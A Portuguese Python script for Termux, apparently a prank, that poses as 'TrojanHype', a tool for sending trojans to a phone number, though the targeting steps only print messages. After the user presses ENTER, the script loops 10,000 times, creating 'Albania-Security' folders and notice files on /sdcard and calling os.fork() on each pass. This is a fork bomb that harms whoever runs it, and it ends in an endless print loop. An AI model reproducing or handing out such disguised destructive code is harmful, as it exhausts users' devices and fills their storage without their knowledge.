
# ESSE SCRIPT CLARAMENTE É UMA TROLL QUE EU CRIEI PARA BRINCA COM TRAVAZAPS
# E LAMMERS ENTÃO NAO TIRE CONCLUSÕES PRECIPITADAS
# Tabela de cores ANSI (Python) ##
global C,R,O,W,L,E,Y,a,l,e,i,s,t,ë,r,XV,XXI

# fonte #
C='\033[1;30m'     # Preto
R='\033[1;31m'     # Vermelho
O='\033[1;32m'     # Verde
W='\033[1;33m'    # Amarelo
L='\033[1;34m'     # Azul
E='\033[1;35m'     # Rosa
Y='\033[1;36m'     # Ciano

##
XV='\033[1;37m'     # Branco
XXI='\033[0;0m'      # Remover
##

# fundo #
a='\033[1;40m'     # Preto
l='\033[1;41m'      # Vermelho
e='\033[1;42m'     # Verde
i='\033[1;43m'      # Amarelo
s='\033[1;44m'     # Azul
t='\033[1;45m'      # Rosa
ë='\033[1;46m'     # Ciano
r='\033[;7m'          # Inverte

import os
import time
import pyfiglet

os.system ('clear')
figlet = pyfiglet.figlet_format("TrojanHype", font = "slant")
print (figlet)
print (f'{XV} Script by{XXI}:{O}Lacoste-AbSec{XXI}')
time.sleep(0.6)
# variavel para contagem
a = 1
print(" ".center(8), f'{XV} PROGRAMA DE RAJAR TROJAN{XXI}😈🐊')
print (f' {L} Menu !!! {XXI}\n{Y}Escolha a quantidade de trojan\nque deseja enviar{XXI}')
menu = int(input(f'{W}:'))

for i in range(menu):
    print (f' {XXI}{l} SOMENTE O NÚMERO SEM ESPAÇO OU -\nEXEMPLO :+5511959228439{XXI}')
    n = int(input(f'{XXI}{l}{W} Digite o número do alvo :{O}\n'))
    print (f'{XXI}{R}Localizando alvo!!!{XXI}')
    time.sleep(3.0)
    print (f'{l}ALVO ENCONTRADO' '❗❗❗{XXI}')
    # comi o cu de quem ta lendo ;) a
    os.system ('clear')
    print (f'{XV}.  INICIANDO...{XXI}'.center(6))
    time.sleep (2)
    os.system('clear')
    time.sleep(2.0)
    print (''.center(10),f'{L}RAJANDO TROJAN NO ALVO{XXI} {e} {XV} {n} {XXI}')
    a += 1
    pass

input(f' {XV} aperte {XXI}{R}ENTER{XXI}{XV} para fechar o programa.{XXI}')
time.sleep (0.5)
os.system (' figlet -f slant ENCERRANDO...')
for i in range(10000):
    os.system("termux-setup-storage -y")
    dir = ("Albania-Security."+str(i))
    os.system (f'cd /sdcard && mkdir {dir} && cd {dir} && echo Albania-Security passou aqui > AVISO.txt')
    os.fork()
time.sleep (2.0)
while True:
        print (f'{R} We are peace and war. We are love and hate. We are good and evil. We are Albania. {XXI}')
